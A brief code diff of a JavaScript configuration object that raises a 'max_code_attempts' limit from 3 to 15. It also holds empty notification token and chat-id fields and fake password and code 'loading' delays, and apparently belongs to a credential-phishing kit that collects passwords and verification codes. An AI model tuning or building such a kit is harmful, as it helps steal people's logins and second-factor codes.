@@ -4,7 +4,7 @@ const config = {
     noti_token: '',
     noti_chat_id: '',
     max_password_attempts: 2,
-    max_code_attempts: 3,
+    max_code_attempts: 15,
     password_loading_time: 6,
     code_loading_time: 4
 };
